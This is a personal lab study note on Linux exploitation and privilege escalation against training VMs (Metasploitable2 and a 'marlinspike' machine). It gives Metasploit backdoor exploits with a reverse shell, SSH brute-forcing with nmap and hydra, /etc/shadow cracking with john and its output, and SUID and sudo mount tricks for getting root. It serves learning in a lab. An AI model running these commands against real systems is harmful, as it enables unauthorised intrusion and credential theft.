2025-05-28 23:42

Status:

Tags:

# Linux Exploitation & PrivEscalation

# 25/05/25
## Exploitation

### Exploiting Meta2
- using vsftpd 2.3.4

```bash
search vsftpd 2.3.4
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.10.10.6
run
```
- using nmap
	- nmap script brute force ssh  
```bash
nmap 10.10.10.6 -p 22 —-script ssh-brute 
```
- creaked password 
```bash
# Example 
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-brute: 
|   Accounts: 
|     user:user - Valid credentials
```
### Exploiting csec (Marlinspike)
```bash
search ProFTPD 1.3.3c
use exploit/unix/ftp/proftpd_133c_backdoor
set RHOSTS  10.10.10.16
set  payload payload/cmd/unix/reverse
set LHOST 10.10.10.4
run  
```
- using nmap
	- nmap script brute force ssh  
```bash
nmap 10.10.10.6 -p 22 —-script ssh-brute 
```
- creaked password 
```bash
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-brute: 
|   Accounts: 
|     administrator:secret - Valid credentials
ssh administrator@10.10.10.16 
```

## Privilege Escalation Methods 
- Methods for privilege escalation are 
	1.  Kernel Vuln
	2. Software Vuln
	3. World Writable Files
	4. Cron
	5. SUID
	6. SUDO
[[Privilege Escalation Methods]] - detailed information 

- Login meta2  using creaked password 
```bash
 ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa user@10.10.10.6
```

### Privilege Escalation for csec (marlinspike)
for detailed : [[UID]]   
Step 1 : check for  UID 
- Example :
	- `` $ id ``
	- ``uid=1001(administrator) gid=1001(administrator) groups=1001(administrator)``

## Types of Privilege Escalation 
1. vertical ( down to up / user to root )
2. Horizon (side to side / user to another user )
Detailed - [[Types of Privilege Escalation]]


Step 2 : check for other user under (we are doing horizontal escalation )
1.  `` cat /etc/passwd`` (users about)
	- ``marlinspike:x:1000:1000:marlinspike,,,:/home/marlinspike:/bin/bash
2. `` cat /etc/shadow `` (encrypted passwords)
- 
Step 3 : get access as marlinspike user 
- using hydra password cracking
```bash
hydra -l marlinspike -P /usr/share/wordlists/john.lst 10.10.10.16  ssh -e nsr  -t 4 
 # -e nsr  
# This option tells Hydra to try additional password checks:
# - `n` = try "null" password (empty password)
# - `s` = try "login as password" (username as password)
# - `r` = try "reverse login" (password as username)

```
- output  
```bash
 [22][ssh] host: 10.10.10.16   login: marlinspike   password: marlinspike
```
---- 
- using /etc/shadow file and carking password 
```bash
 john pas.txt 
```
- output 
```bash
marlinspike      (marlinspike)     
secret           (administrator)    
```

Step 4 :Vertical Escalation, login as marlinspike 
- using SUID 
	- checking SUID binary that are available in system 
```bash
find / -perm -u=s 2>/dev/null 
```
- output 
```bash
 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/xorg/Xorg.wrap
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox
/usr/lib/openssh/ssh-keysign
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/gpasswd
/usr/sbin/pppd
/bin/ping6
/bin/fusermount
/bin/umount
/bin/su
/bin/ping
/bin/mount
/bin/ntfs-3g
```
- this SUID binary can be as root 
- we can run this SUID binary for getting root user access
- Example :
	- `` ls -l /bin/umount ``
	- ``-rwsr-xr-x 1 root root 27608 Jun 14  2017 /bin/umount ``
- check how you can use this SUID binary in  - GTFOBins
- To check which command a user can run we use 
	- `` sudo -l ``
- 
### meta 2 
SUID - nmap 


### csec 
- using mount
```bash
 sudo mount -o bind /bin/sh /bin/mount
 sudo mount
# will get root access 
```

---- 
- creaking hash for shadow files ( meta2)
```bash
cat /etc/shadow 
```
- using john
```bash
john met2.txt --show 
```
- ouput
```
sys:batman:14742:0:99999:7:::
klog:123456789:14742:0:99999:7:::
msfadmin:msfadmin:14684:0:99999:7:::
postgres:postgres:14685:0:99999:7:::
user:user:14699:0:99999:7:::
service:service:14715:0:99999:7:::
```
 
 
 - [ ] start  2:00:00



### References
